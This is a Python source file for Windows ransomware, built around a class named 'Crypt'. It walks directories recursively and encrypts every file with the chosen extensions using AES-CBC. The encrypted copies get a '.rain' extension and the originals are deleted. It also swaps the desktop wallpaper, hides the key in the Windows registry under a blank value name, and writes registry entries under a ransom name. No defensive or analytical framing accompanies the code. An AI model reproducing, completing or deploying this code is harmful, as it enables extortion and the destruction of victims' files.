from Crypto.Cipher import AES
from Crypto.Random import new
from os.path import splitext
from os import remove
from shutil import copyfile
from ctypes import windll
from winreg import *
from glob import iglob
from bitstring import BitArray


class Crypt:
    def __init__(self,
                 key: bytes,
                 extensions: list,
                 ransom_name: str,
                 background: str,
                 out_ext='.rain'):
        self.key = key
        self.out_ext = out_ext
        self.extensions = extensions
        self.ransom_name = ransom_name
        self.background = background
        self.save_randomkey()

    def crypt_file(self, file: str):
        # Encrypt a file using AES CBC MODE with the given key
        with open(file, 'rb') as f:
            data = f.read()
        filename = splitext(file)[0]
        extension = (splitext(file)[1]+'.').encode()
        iv = new().read(AES.block_size)
        encryptor = AES.new(self.key, AES.MODE_CBC, iv)
        data = data+b'#'*(16-len(data) % 16)
        dataenc = encryptor.encrypt(data)
        with open(filename+self.out_ext, 'wb') as f:
            f.write(extension+dataenc)
        remove(file)
        return 0

    def change_background(self, appdata: str):
        # Change the user's desktop background and stores the old in Themes folder
        src = appdata+'/Microsoft/Windows/Themes/TranscodedWallpaper'
        dst = appdata+'/Microsoft/Windows/Themes/OldTranscodedWallpaper'
        copyfile(src, dst)
        windll.user32.SystemParametersInfoW(20, 0, self.background, 0)
        return 0

    def save_randomkey(self):
        # Saves the given key (converted to binary) in a Windows registry
        binkey = BitArray(hex=self.key.hex()).bin
        winkey = CreateKey(HKEY_LOCAL_MACHINE, '')
        try:
            SetValueEx(winkey, ' ', 0, REG_SZ, binkey)
        except PermissionError:
            winkey = CreateKey(HKEY_CURRENT_USER, '')
            SetValueEx(winkey, ' ', 0, REG_SZ, binkey)
        return 0

    def registry_key(self, keypath: str, value):
        # Registry a key in Windows registry using the keypath and the value provided
        key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
        try:
            SetValueEx(key, self.ransom_name, 0, REG_SZ, value)
            CloseKey(key)
        except PermissionError:
            key = CreateKey(HKEY_CURRENT_USER, keypath)
            SetValueEx(key, self.ransom_name, 0, REG_SZ, value)
            CloseKey(key)
        return 0

    def crypt_directory(self, dir: str):
        # Crypt a entire directory and its sub-directorys
        for extension in self.extensions:
            filetree = iglob(dir+'/**/*'+extension, recursive=True)
            for file in filetree:
                self.crypt_file(file)
        return 0
